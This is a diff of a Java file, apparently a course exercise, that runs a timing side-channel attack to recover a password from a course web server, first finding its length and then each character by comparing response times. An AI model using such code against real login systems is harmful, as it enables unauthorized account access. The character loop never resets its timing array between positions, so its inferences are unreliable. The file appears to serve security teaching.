@@ -3,8 +3,6 @@ package ex01_M2;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
-import com.sun.xml.internal.ws.util.StringUtils;
-
 public class ex01_M2 {
 
 	static final String URL = "http://aoi.ise.bgu.ac.il/?user=305555179&password=";
@@ -18,7 +16,7 @@ public class ex01_M2 {
 	 */
 	public static void main(String[] args) throws Exception {
 		int difficulty = 1;
-		int attempts = 10;
+		int attempts = 3;
 		//		int len = findPasswordLength(3, difficulty);
 		//		System.out.println("password length: "+len);
 
@@ -34,22 +32,35 @@ public class ex01_M2 {
 		int len = 0;
 		double maxReqTime = 0;
 		int maxLen = 32;
-		double reqTime = 0;
-
-		String passwd = "";
+		double[] reqTimes = new double[maxLen];
+		double tmpReqTime = 0;
+		String passwd;
+		
 		for (int i = 0; i < maxLen; i++) {
-			reqTime = 0;
-			passwd += "a";
-			for (int j = 0; j < attempts; j++) {
-				reqTime += getReqTime(URL+passwd+DIFFICULTY+difficulty); 
-			}
-			reqTime = reqTime/attempts;
-			if (maxReqTime < reqTime) {
-				maxReqTime = reqTime;
-				len = i;
+			reqTimes[i] = Double.MAX_VALUE;
+		}
+		
+		for (int i = 0; i < attempts; i++) {
+			 passwd = "";
+			for (int j = 0; j < maxLen; j++) {
+				passwd += "a";
+				tmpReqTime = getReqTime(URL+passwd+DIFFICULTY+difficulty);
+				if (tmpReqTime < reqTimes[j]) {
+					reqTimes[j] = tmpReqTime;
+				}
+				System.out.println("attempt: "+i+" length: "+(j+1)+" reqTime: "+reqTimes[j]);
 			}
 		}
-
+		
+		for (int i = 0; i < maxLen; i++) {
+			System.out.println("length: "+(i+1)+" reqTime: "+reqTimes[i]);
+			if (maxReqTime < reqTimes[i]) {
+				maxReqTime = reqTimes[i];
+				len = i+1;
+			}
+		}
+		
+		System.out.println("passwd length: "+len);
 		return len;
 	}
 
@@ -58,51 +69,49 @@ public class ex01_M2 {
 		int len = findPasswordLength(attempts, difficulty);
 		int lettersLen = LETTERS.length;
 		double maxReqTime = 0;
-		double reqTime = 0;
-
-		StringBuilder tmpPass = new StringBuilder();
-
-		for (int i = 0; i < len; i++) {
-			tmpPass.append('0');
+		double[] reqTimes = new double[lettersLen];
+		double tmpReqTime = 0;
+		char currChar = '0';
+		String passwd = "";
+		String passSuff = new String(new char[len-1]).replace('\0', '0');
+		
+		for (int i = 0; i < lettersLen; i++) {
+			reqTimes[i] = Double.MAX_VALUE;
 		}
-
-		StringBuilder passwd = new StringBuilder(tmpPass);
-
-		for (int i = 0; i < len -1; i++) {
-			
+		
+		for (int i = 0; i < len-1; i++) {
 			maxReqTime = 0;
-			tmpPass = new StringBuilder(passwd);
-			
-			for (int j = 0; j < lettersLen; j++) {
-
-				reqTime = 0;
-
-				tmpPass.setCharAt(i, LETTERS[j]);
-
-				for (int k = 0; k < attempts; k++) {
-					reqTime += getReqTime(URL+passwd+DIFFICULTY+difficulty); 
-				}
-
-				reqTime = reqTime/attempts;
-				if (maxReqTime < reqTime) {
-					maxReqTime = reqTime;
-					passwd.setCharAt(i, LETTERS[j]);
+			for (int j = 0; j < attempts; j++) {
+				for (int k = 0; k < lettersLen; k++) {
+					tmpReqTime = getReqTime(URL+passwd+LETTERS[k]+passSuff+DIFFICULTY+difficulty);
+					if (tmpReqTime < reqTimes[k]) {
+						reqTimes[k] = tmpReqTime;
+					}
+					System.out.println("attempt: "+j+" passwd: "+passwd+LETTERS[k]+passSuff+" reqTime: "+tmpReqTime);
 				}
 				
-				System.out.println("reqTime: "+reqTime+", tmPass: "+tmpPass);
+			}
+			
+			for (int j = 0; j < lettersLen; j++) {
+				System.out.println("passwd: "+passwd+LETTERS[j]+passSuff+" reqTime: "+reqTimes[j]);
+				if (maxReqTime < reqTimes[j]) {
+					maxReqTime = reqTimes[j];
+					currChar = LETTERS[j];
+				}
+			}
+			
+			passwd += currChar;
+			passSuff = passSuff.substring(1);
+		}
+		
+		for (int i = 0; i < lettersLen; i++) {
+			if(sendReq(URL+passwd+LETTERS[i]+DIFFICULTY+difficulty)) {
+				passwd+=LETTERS[i];
+				return passwd;
 			}
 		}
-
-		for (int j = 0; j < lettersLen; j++) {
-
-			passwd.setCharAt(len-1, LETTERS[j]);
-
-			if(sendReq(URL+passwd+DIFFICULTY+difficulty)) {
-				return passwd.toString();
-			}
-		}
-
-		return passwd.toString();
+		
+		return "";
 	}
 
 	public static boolean sendReq(String url) {
